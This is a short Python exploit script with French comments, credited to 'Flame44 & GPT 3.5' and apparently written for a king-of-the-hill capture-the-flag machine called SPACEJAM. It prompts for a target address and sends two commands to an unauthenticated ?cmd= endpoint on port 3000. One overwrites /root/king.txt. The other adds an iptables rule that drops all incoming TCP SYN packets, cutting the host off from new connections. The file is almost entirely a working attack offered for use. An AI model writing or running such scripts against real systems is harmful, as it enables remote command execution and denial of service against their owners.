import requests

print("""
\033[38;5;27m
  ██████╗ ██████╗ ██╗    ██╗ ██████╗ ███╗   ██╗████████╗
 ██╔════╝██╔═══██╗██║    ██║██╔═══██╗████╗  ██║╚══██╔══╝
 ██║     ██║   ██║██║ █╗ ██║██║   ██║██╔██╗ ██║   ██║   
 ██║     ██║   ██║██║███╗██║██║   ██║██║╚██╗██║   ██║   
 ╚██████╗╚██████╔╝╚███╔███╔╝╚██████╔╝██║ ╚████║   ██║   
  ╚═════╝ ╚═════╝  ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   
\033[0m
""")

print("\033[38;5;21mFlame44 & GPT 3.5 the goat, exploit for SPACEJAM MACINE \033[0m")

def execute_command(address):
    # Exécuter la première commande pour écrire "flame44" dans /root/king.txt
    url1 = f"http://{address}:3000/?cmd=echo%20%22flame44%22%20%3E%20/root/king.txt"
    response1 = requests.get(url1)
    
    # Vérifier la réponse de la première commande
    if response1.status_code == 200:
        print("La première commande a été exécutée avec succès.")
    else:
        print("La première commande a échoué.")

    # Exécuter la deuxième commande pour ajouter une règle iptables
    url2 = f"http://{address}:3000/?cmd=sudo%20iptables%20-A%20INPUT%20-p%20tcp%20--syn%20-j%20DROP"
    response2 = requests.get(url2)
    
    # Vérifier la réponse de la deuxième commande
    if response2.status_code == 200:
        print("La deuxième commande a été exécutée avec succès.")
    else:
        print("La deuxième commande a échoué.")

# Demander à l'utilisateur d'entrer l'adresse cible
address = input("Entrez l'adresse cible : ")

# Exécuter les commandes HTTP spécifiées
execute_command(address)
